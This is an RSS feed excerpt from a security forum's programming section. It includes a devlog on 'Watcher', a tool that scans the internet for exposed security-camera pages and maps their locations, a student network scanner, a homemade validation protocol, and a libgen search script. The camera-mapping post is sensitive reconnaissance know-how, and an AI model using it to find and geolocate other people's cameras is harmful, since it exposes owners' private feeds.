<p>Further building up on this, the map is built using tiles from a remote server: currently <a href="https://stamen.com/" rel="noopener nofollow ugc">Stamen</a>, but most <a href="https://wiki.openstreetmap.org/wiki/Tile_servers" rel="noopener nofollow ugc">tile servers</a> which used the same specification as <a href="https://wiki.openstreetmap.org" rel="noopener nofollow ugc">OpenStreetMap</a> can be used.</p>
<p>Geolocation is handled by <a href="http://ipinfo.io" rel="noopener nofollow ugc">ipinfo.io</a>, using their public API. This is rate limited to 1000 requests a day, but Watcher will just store the addresses which need to be resolved and try again later.</p>
<h1>The current state</h1>
<p>The plugin architecture is now working properly, allowing new components to be added without considerable overhead. The most basic way of finding cameras has been implemented: a simple multi-threaded portscanner scans the internet for webservers on certain ports (80, 81, 8000) and then forwards any results to a plugin which tries to identify if a webpage contains a camera or not, based on a growing ruleset. The vast majority of cameras have specific titles on their pages which makes this less of a faff than it would be otherwise.</p>
<p>Once a camera has been identified, the IP address is sent to the geolocation plugin so it can be represented on our map.</p>
<h1>Increasing coverage</h1>
<p>Obviously, scanning the entire internet takes a while. Quite a while, particularly if you’re thinking on being thorough and increasing the number of ports to scan for! Even using something like <a href="https://github.com/robertdavidgraham/masscan/" rel="noopener nofollow ugc">masscan</a>, you’d need a fairly fat pipe and a serious router. So, there are two additional plugins in the pipeline: one which will leverage Shodan, another which will use Google with specially targetted search terms.</p>
<h1>Next in the pipeline</h1>
<p>The map is currently quite basic. The user can scroll around, zoom in/out and see the camera markers, but can’t select them. The tile streaming is also a bit flakey and it’s possible for a tile which is in use to be unloaded, only to get loaded again a few seconds later. It isn’t great work and I could take some shortcuts to get the entire flow running sooner, but since I have no time constraints I can build a solid foundation and get something I’m happy with.</p>
<h1>Source?</h1>
<p>Open source, of course. You’ll find the code in the <a href="https://gitlab.com/hostile.node/watcher" rel="noopener nofollow ugc">project’s GitLab</a>. At the moment it only successfully builds on Windows, I need to spend some time wrangling the makefile <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<h1>Further posts?</h1>
<p>Do you find this kind of development post useful or interesting? Or would you rather just have a post when the tool is ready?</p>
            <p><small>31 posts - 12 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/watcher-mapping-addressable-security-cameras-a-devlog/14650">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/watcher-mapping-addressable-security-cameras-a-devlog/14650</link>
          <pubDate>Fri, 28 Jun 2019 12:18:44 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-14650</guid>
          <source url="https://d.clarkee.co.uk/t/watcher-mapping-addressable-security-cameras-a-devlog/14650.rss">Watcher - mapping addressable security cameras - a devlog</source>
        </item>
        <item>
          <title>C# Scanning Project</title>
          <dc:creator><![CDATA[W4K3Y]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>A <strong>C#</strong> scanning project?!</p>
<p>Yeah i know C#… A odd programming choice, but I am doing this for a University project.  The project brief is to create a Windows desktop application in either UWP or WPF.</p>
<p>I started this degree as my lack of development skills was holding me back, what have I learnt… that i suck at programming.</p>
<p>I have just started this project and I am looking for some assistance and guidance as this is a bit of a step up from last year.</p>
<p>The idea of the project is that my network scanner will scan a class C network for live hosts and then conduct a port scan. Think Nmap… if it was really really shit.   I cant see this tool being used by the community, due to 1. This is made by an amateur and 2. there wont be as much functionality.</p>
<p>Now I would like to add some enumeration stuff in, but as I have to hand it in this around November time it is unlikely that i will be able to do this.</p>
<hr>
<p>TO-DO:</p>
<p>*Finish off navigation UI – Cant seem to go to my other dynamic pages.</p>
<h2>*Scanner – Absolutely no idea where to start on the scanner, seen loads of stuff online for multiple programming languages and for a console use, but nothing that could help me on a GUI desktop design.</h2>
<p>I have been using GitHub here: <a href="https://github.com/W4KEY/WpfRecon" rel="nofollow noopener">https://github.com/W4KEY/WpfRecon</a>.</p>
<p>Any advice, links, ideas, codes snips would be very welcome.</p>
            <p><small>7 posts - 4 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/c-scanning-project/14228">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/c-scanning-project/14228</link>
          <pubDate>Sat, 08 Jun 2019 18:32:06 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-14228</guid>
          <source url="https://d.clarkee.co.uk/t/c-scanning-project/14228.rss">C# Scanning Project</source>
        </item>
        <item>
          <title>SXP - My very own internal communication protocol</title>
          <dc:creator><![CDATA[Shellsquid]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hello 0x00sec,</p>
<blockquote>
<p><strong>In the following I want to give you an idea of the inner workings of a protocol that I’m currently developing.</strong><br>
<br>First and foremost I’m looking for feedback. I’m not sure in how fare anyone has experience in something like this but at least you likely know how to break it - so I get ideas on how to improve it.</p>
</blockquote>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/0/090e47b9b32ca0235887379d416a052b42c833f5.png" data-download-href="/uploads/short-url/1i6TkhqyCy3uZH51beNrFrOcy1f.png?dl=1" title="24" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/090e47b9b32ca0235887379d416a052b42c833f5.png" alt="24" data-base62-sha1="1i6TkhqyCy3uZH51beNrFrOcy1f" width="690" height="430"></a></div><p></p>
<p>In the past days I’ve been working on an idea for my project.</p>
<p>For the project, a web platform, I wanted to be familiar with object oriented PHP, which I will use for an essential part of it.</p>
<blockquote>
<p>The general architecture of the platform is based on three levels:</p>
<ul>
<li> I/O Level 
</li><li> Processing Level
</li><li> Data Core 
</li></ul>
</blockquote>
<p>As I have a lot of different modules interacting/communicating with each other, I wanted to create a standardized way how they communicate.</p>
<blockquote>
<p><strong>The idea of a protocol was born.</strong></p>
<p><strong>I called it SXP - for two reason:</strong></p>
<ol>
<li>It sounds flashy!</li>
<li>The platform is called “SCARDA”, thus Scarda Exchange Protocol<br>
<br></li>
</ol>
</blockquote>
<p>The general concept of the protocol packet is quite easy:</p>
<pre><code>*----------------*
|     HEADER     |
*----------------*
|      HASH      |
*----------------*
|                |
|     BODY /     |
|    PAYLOAD     |
|                |
*----------------*
</code></pre>
<p>The <code>HEADER</code> contains four elements:</p>
<pre><code>*--------------------*
|  DESTINATION DEPT. |
*--------------------*
|  DESTINATION DIV.  |
*--------------------*
|    SOURCE DEPT.    |
*--------------------*
|     SOURCE DIV.    |
*--------------------*
</code></pre>
<p>Whereas all information in the <code>HEADER</code> are represented by integers:</p>
<pre><code>DESTINATION DEPT.
'--&gt;  General Branch of Destination (what kind of module is it? Processing, Query etc.)

DESTINATION DIV.  
'--&gt;  Specific module, such as a certain analysis module


Same goes for the SOURCE
</code></pre>
<p>So, the <code>HEADER</code> tells about the WHERE:</p>
<ol>
<li>Where is the packet going?</li>
<li>Where does it come from?</li>
</ol>
<p><strong>Now comes the interesting part:</strong><br>
Next section of the packet is the <code>HASH</code>.</p>
<p>I wanted to have a self-validating protocol that makes sure only the right information is transferred to the right place. So I came up the a basic idea:</p>
<p>When information is ready to be sent off, the <code>SOURCE</code> sends its <code>HEADER</code> to the</p>
<pre><code>IVM = Internal Validation Module
</code></pre>
<blockquote>
<p><strong><br>Then the following process takes place:</strong></p>
<ol>
<li>The <strong><code>IVM</code></strong> reads the <strong><code>HEADER</code></strong>.</li>
<li>It creates a random <strong><code>SHA512 HASH</code></strong> (10 digit random integer to SHA512).<br>
2.5 This happens everytime a packet sends its <strong><code>HEADER</code></strong> to the IVM, so each transfer has a unique <strong><code>HASH</code></strong>.</li>
<li>It sends the <strong><code>SOURCE</code></strong> information (two integers) and the <strong><code>HASH</code></strong> to the <strong><code>DESTINATION</code></strong>.</li>
<li>At <strong><code>DESTINATION</code></strong> the information is put on a  <strong><code>STACK / QUEUE</code></strong>.</li>
<li>The <strong><code>IVM</code></strong> then sends the <strong>same</strong> <strong><code>HASH</code></strong> to the <strong><code>SOURCE</code></strong>.</li>
<li>The <strong><code>SOURCE</code></strong> adds the <strong><code>HASH</code></strong> to the <strong><code>HEADER</code></strong> and loads on the <strong><code>PAYLOAD</code></strong>, here called <strong><code>BODY</code></strong>.</li>
<li>Once ready to go, the packet is send to the <strong><code>DESTINATION</code></strong>.</li>
<li>At <strong><code>DESTINATION</code></strong> the packet is going to the <strong><code>STACK</code></strong>, where the actual validation happens when the <strong><code>HASHES</code></strong> are compared.</li>
<li>If packet and stack have the same <strong><code>HASH</code></strong>, the packet is allowed to unload its data at the <strong><code>DESTINATION</code></strong>.</li>
</ol>
</blockquote>
<br>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/5/50f228425be9317a2216c2c434f00f490a0fb67f.png" data-download-href="/uploads/short-url/by51422DLBQWsd64Td5QdeOHNTx.png?dl=1" title="46" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/50f228425be9317a2216c2c434f00f490a0fb67f.png" alt="46" data-base62-sha1="by51422DLBQWsd64Td5QdeOHNTx" width="689" height="435"></a></div><p></p>
<br>
<p>Each module is <strong><code>SOURCE</code></strong> and <strong><code>DESTINATION</code></strong> at the same time(except those on I/O level)  so all modules can communicate with each other.</p>
<p>So far, that’s it.</p>
<p>Tthis was basically just for fun as I wanted to do something to learn OOP in PHP and didn’t want to feel miserable when failing at the actual task, the backend of the platform.</p>
<blockquote>
<p>However, I had two more ideas about it:</p>
<ul>
<li>
<p>Transferring this concept on the internet, where a server (?) might act as the IVM, sending those hashes to the connecting parties</p>
</li>
<li>
<p>Transferring this concept to the very core of an OS</p>
</li>
</ul>
<p>Both could be combined with a decent encryption as well to make it almost impossible to capture/infiltrate the stream of data.</p>
</blockquote>
<p>As mentioned at the very beginning, I’m looking forward to feedback in any form!<br>
<br></p>
<p>Cheers</p>
            <p><small>7 posts - 4 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/sxp-my-very-own-internal-communication-protocol/12766">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/sxp-my-very-own-internal-communication-protocol/12766</link>
          <pubDate>Thu, 04 Apr 2019 19:56:34 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-12766</guid>
          <source url="https://d.clarkee.co.uk/t/sxp-my-very-own-internal-communication-protocol/12766.rss">SXP - My very own internal communication protocol</source>
        </item>
        <item>
          <title>My book searching function (libgen, no api)</title>
          <dc:creator><![CDATA[fxbg]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>I noticed they had API for libgen now, however I’m not sure how to search with it by title so I just decided to curl it out myself lol. I am sure it’s something I am doing wrong with the API, but sometimes API sucks, so meh.</p>
<pre><code class="lang-auto">function __booksearch
{
        bs=urlencode "${1}" &amp;&gt; /dev/null
        curl -s "http://libgen.io/search.php?req="$bs"&amp;lg_topic=libgen&amp;open=0&amp;view=simple&amp;res=999&amp;phrase=1&amp;column=def" &gt;books
        id=$(grep -Eio "id[=][0-9]{7}&gt;(.+?)" books|cut -d '=' -f 2|cut -d '&gt;' -f 1)
        title=$(grep -Eio "id[=][0-9]{7}&gt;(.+?)" books|cut -d '&gt;' -f 2|cut -d '&lt;' -f 1)
        rm books
        echo "[$id] $title"
}
alias booksearch='__booksearch'
</code></pre>
<p>usage:</p>
<pre><code class="lang-auto">(xenial)root@localhost:~/# booksearch "red team field manual"
[1160277] Rtfm: Red Team Field Manual
</code></pre>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/my-book-searching-function-libgen-no-api/10761">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/my-book-searching-function-libgen-no-api/10761</link>
          <pubDate>Wed, 09 Jan 2019 23:10:44 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-10761</guid>
          <source url="https://d.clarkee.co.uk/t/my-book-searching-function-libgen-no-api/10761.rss">My book searching function (libgen, no api)</source>
        </item>
  </channel>
</rss>
